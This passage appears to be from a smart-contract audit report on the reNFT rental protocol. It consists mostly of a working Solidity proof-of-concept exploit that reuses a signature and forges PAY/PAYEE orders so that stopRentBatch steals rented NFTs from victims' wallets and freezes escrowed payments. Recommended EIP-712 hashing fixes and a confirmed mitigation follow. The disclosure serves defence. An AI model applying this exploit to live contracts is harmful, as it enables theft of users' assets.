// SPDX-License-Identifier: BUSL-1.1pragmasolidity^0.8.20;import{BaseTest}from"@test/BaseTest.sol";import{OrderType,OrderMetadata,RentalOrder,RentPayload,OrderFulfillment,Item,SettleTo,ItemTypeasreNFTItemType}from"@src/libraries/RentalStructs.sol";import{ConsiderationItem,OfferItem,OrderParameters,OrderComponents,Order,AdvancedOrder,ItemType,CriteriaResolver,Fulfillment,FulfillmentComponent,OrderTypeasSeaportOrderType}from"@seaport-types/lib/ConsiderationStructs.sol";import{MockERC721}from"../mocks/tokens/standard/MockERC721.sol";import{MockERC20}from"../mocks/tokens/standard/MockERC20.sol";import{MockERC1155}from"../mocks/tokens/standard/MockERC1155.sol";import{Seaport}from"../fixtures/external/Seaport.sol";import{OrderParametersLib}from"@seaport-sol/SeaportSol.sol";import{SafeL2}from"@safe-contracts/SafeL2.sol";import{Stop}from"../fixtures/protocol/Protocol.sol";contractAttackerContract{addresssafe;addressseaportConduit;Seaportseaport;OrderpayOrder;OrderpayeeOrder;AdvancedOrderpayAdvancedOrder;AdvancedOrderpayeeAdvancedOrder;FulfillmentfulfillmentERC721;FulfillmentfulfillmentERC20;constructor(address_conduit,address_token,Seaport_seaport)public{seaportConduit=_conduit;seaport=_seaport;MockERC20(_token).approve(_conduit,type(uint256).max);}functiongetPayOrderParams()externalviewreturns(OrderParametersmemory) {returnpayOrder.parameters;}functiongetPayeeOrderParams()externalviewreturns(OrderParametersmemory) {returnpayeeOrder.parameters;}functiongetPayOrderParamsToHash(ItemTypeitemType,addresstoken,uint256tokenId,uint256amount)externalviewreturns(OrderParametersmemory) {OrderParametersmemoryparameters=payOrder.parameters;parameters.offer[0].itemType=itemType;parameters.offer[0].token=token;parameters.offer[0].identifierOrCriteria=tokenId;parameters.offer[0].startAmount=amount;parameters.offer[0].endAmount=amount;returnparameters;}functionstoreSafe(address_safe)external{safe=_safe;}functionstorePayOrder(Ordercalldata_order)external{payOrder=_order;}functionstorePayeeOrder(Ordercalldata_order)external{payeeOrder=_order;}functionstorePayAdvancedOrder(AdvancedOrdercalldata_advancedOrder)external{payAdvancedOrder=_advancedOrder;}functionstorePayeeAdvancedOrder(AdvancedOrdercalldata_advancedOrder)external{payeeAdvancedOrder=_advancedOrder;}functionstoreFulfillment(Fulfillmentcalldata_fulfillmentERC721,Fulfillmentcalldata_fulfillmentERC20)external{fulfillmentERC721=_fulfillmentERC721;fulfillmentERC20=_fulfillmentERC20;}functionstopRental(RentalOrdercalldatarentalOrder,Stopstop)external{stop.stopRent(rentalOrder);}functionstopRentals(RentalOrder[]calldatarentalOrders,Stopstop)external{stop.stopRentBatch(rentalOrders);}functiononERC1155Received(address,address,uint256tokenId,uint256amount,bytescalldata)externalreturns(bytes4) {addresstoken=msg.sender;_executeCallback(ItemType.ERC1155,token,tokenId,amount);returnthis.onERC1155Received.selector;}functiononERC721Received(address,address,uint256tokenId,bytescalldata)externalreturns(bytes4) {addresstoken=msg.sender;uint256amount=1;_executeCallback(ItemType.ERC721,token,tokenId,amount);returnthis.onERC721Received.selector;}function_executeCallback(ItemTypeitemType,addresstoken,uint256tokenId,uint256amount)internal{// update storage for this specific nft_initializeNFT(itemType,token,tokenId,amount);// approve seaport to handle received NFT_approveSeaportConduit(itemType,token,tokenId);// validate pay order_validateOnChain(payOrder);// validate payee order_validateOnChain(payeeOrder);// fulfill order as renter_fulfillOrder();}function_approveSeaportConduit(ItemTypeitemType,addresstoken,uint256tokenId)internal{if(itemType==ItemType.ERC721) {MockERC721(token).approve(seaportConduit,tokenId);}if(itemType==ItemType.ERC1155) {MockERC1155(token).setApprovalForAll(seaportConduit,true);}}function_validateOnChain(Ordermemoryorder)internal{Order[]memoryorders=newOrder[](1);orders[0] =order;seaport.validate(orders);}function_fulfillOrder()internal{AdvancedOrder[]memoryadvancedOrders=newAdvancedOrder[](2);advancedOrders[0] =payAdvancedOrder;advancedOrders[1] =payeeAdvancedOrder;Fulfillment[]memoryfulfillments=newFulfillment[](2);fulfillments[0] =fulfillmentERC721;fulfillments[1] =fulfillmentERC20;seaport.matchAdvancedOrders(advancedOrders,newCriteriaResolver[](0),fulfillments,address(0));}function_initializeNFT(ItemTypeitemType,addresstoken,uint256tokenId,uint256amount)internal{payAdvancedOrder.parameters.offer[0].itemType=itemType;payAdvancedOrder.parameters.offer[0].token=token;payAdvancedOrder.parameters.offer[0].identifierOrCriteria=tokenId;payAdvancedOrder.parameters.offer[0].startAmount=amount;payAdvancedOrder.parameters.offer[0].endAmount=amount;payeeAdvancedOrder.parameters.consideration[0].itemType=itemType;payeeAdvancedOrder.parameters.consideration[0].token=token;payeeAdvancedOrder.parameters.consideration[0].identifierOrCriteria=tokenId;payeeAdvancedOrder.parameters.consideration[0].startAmount=amount;payeeAdvancedOrder.parameters.consideration[0].endAmount=amount;payeeAdvancedOrder.parameters.consideration[0].recipient=payable(safe);payOrder.parameters.offer[0].itemType=itemType;payOrder.parameters.offer[0].token=token;payOrder.parameters.offer[0].identifierOrCriteria=tokenId;payOrder.parameters.offer[0].startAmount=amount;payOrder.parameters.offer[0].endAmount=amount;payeeOrder.parameters.consideration[0].itemType=itemType;payeeOrder.parameters.consideration[0].token=token;payeeOrder.parameters.consideration[0].identifierOrCriteria=tokenId;payeeOrder.parameters.consideration[0].startAmount=amount;payeeOrder.parameters.consideration[0].endAmount=amount;payeeOrder.parameters.consideration[0].recipient=payable(safe);}}contractStealAllRentedNFTs_POCisBaseTest{functiontestStealAllRentedNFTs()public{// ------ Setting up previous state ------ //// create and fulfill orders that we will exploit(Ordermemoryorder,OrderMetadatamemorymetadata,RentalOrder[]memoryvictimRentalOrders) =_createAndFulfillVictimOrders();// ------ Prerequisites ------ //// instantiate attackerContractAttackerContractattackerContract=newAttackerContract(address(conduit),// seaport conduitaddress(erc20s[0]),// token we will use for our rental ordersseaport);// send arbitrary # of ERC20 tokens for rental payment to our attackerContracterc20s[0].mint(address(attackerContract),victimRentalOrders.length);// we will be stealing from two rentals and use 1 wei for each// create a safe for our attackerContractaddressattackerSafe;{// to fix stack too deep errorsaddress[]memoryowners=newaddress[](1);owners[0] =address(attackerContract);attackerSafe=factory.deployRentalSafe(owners,1);}attackerContract.storeSafe(attackerSafe);// obtain generic signature for `RentPayload`// this is done via the front-end for any order and we will then use matching `OrderMetadata.rentDuration` and `OrderMetadata.hooks` fields when creating our new order// `RentPayload.intendedFulfiller` will be our attackerContract and `RentPayload.fulfillment` will be our attackerContract's safe// any expiration given to us by the front-end would do since we will be executing these actions programmaticallyRentPayloadmemoryrentPayload=RentPayload(OrderFulfillment(attackerSafe),metadata,block.timestamp+100,address(attackerContract));// using Alice's metadata (order) as an example, but could realistically be any order// generate the signature for the payload (simulating signing an order similar to Alice's (metadata only) via the front end)bytesmemorysignature=_signProtocolOrder(rentalSigner.privateKey,create.getRentPayloadHash(rentPayload));// ------ Prep `attackerContract` ------ //// precompute `validate()` calldata for new order (PAY order) for on-chain validation// re-purpose Alice's order (for simplicity) for our use by replacing all necessary fields with values that pertain to our new orderorder.parameters.offerer=address(attackerContract);{// to fix stack too deep errorsConsiderationItem[]memoryconsiderationItems=newConsiderationItem[](0);order.parameters.consideration=considerationItems;// no consideration items for a PAY orderOfferItem[]memoryofferItems=newOfferItem[](2);// offerItems[0] will change dynamically in our attacker contractofferItems[1] =OfferItem({itemType:ItemType.ERC20,token:address(erc20s[0]),identifierOrCriteria:uint256(0),startAmount:uint256(1),endAmount:uint256(1)});order.parameters.offer=offerItems;order.parameters.totalOriginalConsiderationItems=0;// 0 since this is a PAY order// store `validate()` calldata for PAY order in attackerContract for later useattackerContract.storePayOrder(order);}// precompute `validate()` calldata for new order (PAYEE order) for on-chain validation (attackerContract is offerer and fulfiller){// to fix stack too deep errorsConsiderationItem[]memoryconsiderationItems=newConsiderationItem[](2);// considerationItems[0] will change dynamically in our attacker contractconsiderationItems[1] =ConsiderationItem({itemType:ItemType.ERC20,token:address(erc20s[0]),identifierOrCriteria:uint256(0),startAmount:uint256(1),endAmount:uint256(1),recipient:payable(address(ESCRW))});order.parameters.consideration=considerationItems;// considerationItems for PAYEE mirror offerItems from PAYOfferItem[]memoryofferItems=newOfferItem[](0);order.parameters.offer=offerItems;// no offerItems for PAYEEorder.parameters.totalOriginalConsiderationItems=2;// 2 since this is our PAYEE order// store `validate()` calldata for PAYEE order in attackerContract for later useattackerContract.storePayeeOrder(order);}// precompute `matchAdvancedOrders()` calldata for fulfillment of the two orders (PAY + PAYEE) and store in attackerContract// construct AdvancedOrder[] calldata{// to fix stack too deep errorsrentPayload.metadata.orderType=OrderType.PAY;// modify OrderType to be a PAY order (necessary for exploit). orderType not checked during signature validationAdvancedOrdermemorypayAdvancedOrder=AdvancedOrder(attackerContract.getPayOrderParams(),1,1,hex"",// signature does not matterabi.encode(rentPayload,signature)// extraData. Note: we are re-using the signature we received from alice's metadata);rentPayload.metadata.orderType=OrderType.PAYEE;// modify OrderType to be a PAYEE order (necessary for exploit). orderType not checked during signature validationAdvancedOrdermemorypayeeAdvancedOrder=AdvancedOrder(attackerContract.getPayeeOrderParams(),1,1,hex"",// signature does not matterabi.encode(rentPayload,signature)// extraData. Note: we are re-using the signature we received from alice's metadata);// store AdvancedOrder structs in attackerContract for later useattackerContract.storePayAdvancedOrder(payAdvancedOrder);attackerContract.storePayeeAdvancedOrder(payeeAdvancedOrder);}// construct Fulfillment[] calldata{// to fix stack too deep errorsFulfillmentComponent[]memoryofferCompERC721=newFulfillmentComponent[](1);FulfillmentComponent[]memoryconsidCompERC721=newFulfillmentComponent[](1);offerCompERC721[0] =FulfillmentComponent({orderIndex:0,itemIndex:0});considCompERC721[0] =FulfillmentComponent({orderIndex:1,itemIndex:0});FulfillmentComponent[]memoryofferCompERC20=newFulfillmentComponent[](1);FulfillmentComponent[]memoryconsidCompERC20=newFulfillmentComponent[](1);offerCompERC20[0] =FulfillmentComponent({orderIndex:0,itemIndex:1});considCompERC20[0] =FulfillmentComponent({orderIndex:1,itemIndex:1});FulfillmentmemoryfulfillmentERC721=Fulfillment({offerComponents:offerCompERC721,considerationComponents:considCompERC721});FulfillmentmemoryfulfillmentERC20=Fulfillment({offerComponents:offerCompERC20,considerationComponents:considCompERC20});// store Fulfillment[] in attackerContract for later useattackerContract.storeFulfillment(fulfillmentERC721,fulfillmentERC20);}// ------ loop through victimRentalOrders to create our complimentary, malicious rentalOrders ------ //// pre-compute `RentalOrder` for our new rental orders// compute ZoneParameters.orderHash (this is the orderHash for our PAY order)RentalOrder[]memoryrentalOrders=newRentalOrder[](victimRentalOrders.length);for(uint256i;i<victimRentalOrders.length;i++) {ItemmemoryvictimItem=victimRentalOrders[i].items[0];ItemTypeitemType;if(victimItem.itemType==reNFTItemType.ERC721) {itemType=ItemType.ERC721;}if(victimItem.itemType==reNFTItemType.ERC1155) {itemType=ItemType.ERC1155;}bytes32orderHash=seaport.getOrderHash(OrderParametersLib.toOrderComponents(attackerContract.getPayOrderParamsToHash(itemType,victimItem.token,victimItem.identifier,victimItem.amount),0));// construct the malicious rental orderItem[]memoryitems=newItem[](2);items[0] =Item(victimItem.itemType,SettleTo.LENDER,victimItem.token,victimItem.amount,victimItem.identifier);items[1] =Item(reNFTItemType.ERC20,SettleTo.RENTER,address(erc20s[0]),uint256(1),uint256(0));// the same for every malicious orderRentalOrdermemoryrentalOrder=RentalOrder({seaportOrderHash:orderHash,items:items,// only PAY order offer items are added in storagehooks:metadata.hooks,orderType:OrderType.PAY,// only PAY order is added in storagelender:address(attackerContract),renter:address(attackerContract),rentalWallet:attackerSafe,startTimestamp:block.timestamp,endTimestamp:block.timestamp+metadata.rentDuration// note: rentDuration does not matter});// set `rentalOrder.rentalWallet` (currently equal to our attackerContract's safe) to be equal to the victim's saferentalOrder.rentalWallet=victimRentalOrders[i].rentalWallet;rentalOrders[i] =rentalOrder;}// ------ Execute exploit ------ //// call `stopRentBatch(rentalOrders)`. All fields pertain to our soon-to-be created orders, except for the `rentalWallet`, which is pointing to the victim's safe// attackerContract.stopRental(rentalOrder[0], stop);// attackerContract.stopRental(rentalOrder[1], stop);attackerContract.stopRentals(rentalOrders,stop);// ------ Loop over all victimRentalOrders to verify end state ------ //// speed up in time past the victimRentalOrders' expirationvm.warp(block.timestamp+750);for(uint256i;i<victimRentalOrders.length;i++) {ItemmemoryvictimItem=victimRentalOrders[i].items[0];// verify that our attackerContract's safe is now the owner of the NFTif(victimItem.itemType==reNFTItemType.ERC721) {assertEq(MockERC721(victimItem.token).ownerOf(victimItem.identifier),attackerSafe);}if(victimItem.itemType==reNFTItemType.ERC1155) {assertEq(MockERC1155(victimItem.token).balanceOf(attackerSafe,victimItem.identifier),victimItem.amount);}// verify that our rentalOrder has been stopped (deleted from storage)RentalOrdermemoryrentalOrder=rentalOrders[i];bytes32rentalOrderHash=create.getRentalOrderHash(rentalOrder);assertEq(STORE.orders(rentalOrderHash),false);// lender attempts to stop victimRentalOrder, but call fails (renter's safe is no longer the owner of the NFT)vm.startPrank(victimRentalOrders[i].lender);vm.expectRevert();stop.stopRent(victimRentalOrders[i]);vm.stopPrank();// verify that victimRentalOrder has not been stopped (is still in storage)bytes32victimRentalOrderHash=create.getRentalOrderHash(victimRentalOrders[i]);assertEq(STORE.orders(victimRentalOrderHash),true);}// renters' rental payments to lenders' is still in the escrow contractassertEq(erc20s[0].balanceOf(address(ESCRW)),uint256(victimRentalOrders.length*100));// verify that our attackerContract received its rental payment back from all the created malicious ordersassertEq(erc20s[0].balanceOf(address(attackerContract)),victimRentalOrders.length);// End result:// 1. Lenders' NFTs were stolen from renters' safe wallet and is now frozen in the attackerContract's safe wallet// 2. Renters' rental payments to Lenders are frozen in the Escrow contract since their rentals can not be stoppped}function_createAndFulfillVictimOrders()internalreturns(Ordermemoryorder,OrderMetadatamemorymetadata,RentalOrder[]memoryrentalOrders) {// create a BASE order ERC721createOrder({offerer:alice,orderType:OrderType.BASE,erc721Offers:1,erc1155Offers:0,erc20Offers:0,erc721Considerations:0,erc1155Considerations:0,erc20Considerations:1});// finalize the order creation(Ordermemoryorder,bytes32orderHash,OrderMetadatamemorymetadata) =finalizeOrder();// create an order fulfillmentcreateOrderFulfillment({_fulfiller:bob,order:order,orderHash:orderHash,metadata:metadata});// finalize the base order fulfillmentRentalOrdermemoryrentalOrderA=finalizeBaseOrderFulfillment();bytes32rentalOrderHash=create.getRentalOrderHash(rentalOrderA);// assert that the rental order was storedassertEq(STORE.orders(rentalOrderHash),true);// assert that the token is in storageassertEq(STORE.isRentedOut(address(bob.safe),address(erc721s[0]),0),true);// assert that the fulfiller made a paymentassertEq(erc20s[0].balanceOf(bob.addr),uint256(9900));// assert that a payment was made to the escrow contractassertEq(erc20s[0].balanceOf(address(ESCRW)),uint256(100));// assert that a payment was synced properly in the escrow contractassertEq(ESCRW.balanceOf(address(erc20s[0])),uint256(100));// assert that the ERC721 is in the rental wallet of the fulfillerassertEq(erc721s[0].ownerOf(0),address(bob.safe));// create a BASE order ERC1155createOrder({offerer:carol,orderType:OrderType.BASE,erc721Offers:0,erc1155Offers:1,erc20Offers:0,erc721Considerations:0,erc1155Considerations:0,erc20Considerations:1});// finalize the order creation(order,orderHash,metadata) =finalizeOrder();// create an order fulfillmentcreateOrderFulfillment({_fulfiller:dan,order:order,orderHash:orderHash,metadata:metadata});// finalize the base order fulfillmentRentalOrdermemoryrentalOrderB=finalizeBaseOrderFulfillment();rentalOrderHash=create.getRentalOrderHash(rentalOrderB);// assert that the rental order was storedassertEq(STORE.orders(rentalOrderHash),true);// assert that the token is in storageassertEq(STORE.isRentedOut(address(dan.safe),address(erc1155s[0]),0),true);// assert that the fulfiller made a paymentassertEq(erc20s[0].balanceOf(dan.addr),uint256(9900));// assert that a payment was made to the escrow contractassertEq(erc20s[0].balanceOf(address(ESCRW)),uint256(200));// assert that a payment was synced properly in the escrow contractassertEq(ESCRW.balanceOf(address(erc20s[0])),uint256(200));// assert that the ERC721 is in the rental wallet of the fulfillerassertEq(erc1155s[0].balanceOf(address(dan.safe),0),uint256(100));RentalOrder[]memoryrentalOrders=newRentalOrder[](2);rentalOrders[0] =rentalOrderA;rentalOrders[1] =rentalOrderB;return(order,metadata,rentalOrders);}}
Additional PoC for “lesser”highseverity/impact vulnerability achieved via only exploiting bug#2:reNFT-StealERC1155Tokens_PoC.md
Recommended Mitigation Steps
By addressing the non-compliant EIP-712 functions we can mitigate the main exploit path described in this report. I would suggest the following changes:
diff --git a/./src/packages/Signer.sol b/./src/packages/Signer.solindex 6edf32c..ab7e62e 100644--- a/./src/packages/Signer.sol+++ b/./src/packages/Signer.sol@@ -188,6 +188,7 @@ abstract contract Signer {order.orderType,order.lender,order.renter,+                    order.rentalWallet,order.startTimestamp,order.endTimestamp)
diff --git a/./src/packages/Signer.sol b/./src/packages/Signer.solindex 6edf32c..c2c375c 100644--- a/./src/packages/Signer.sol+++ b/./src/packages/Signer.sol@@ -232,8 +232,10 @@ abstract contract Signer {keccak256(abi.encode(_ORDER_METADATA_TYPEHASH,+                    metadata.orderType,metadata.rentDuration,-                    keccak256(abi.encodePacked(hookHashes))+                    keccak256(abi.encodePacked(hookHashes)),+                    metadata.emittedExtraData));}
I would also suggest that theRentPayload, which is the signature digest of the server-side signer, be modified to include a field that is unique to the specific order that is being signed. This would disable users from obtaining a single signature and utilizing that signature arbitrarily (for multiple fulfillments/fulfill otherwise “restricted” orders).
Alec1017 (reNFT) confirmed
Note: See full discussionhere.
reNFT mitigated:
Mitigation of this issue is the result of mitigating a handful of other findings (H-07, M-13, M-11, M-06).
Status:Mitigation confirmed. Full details in reports fromEV_om,sin1st3r__andjuancito.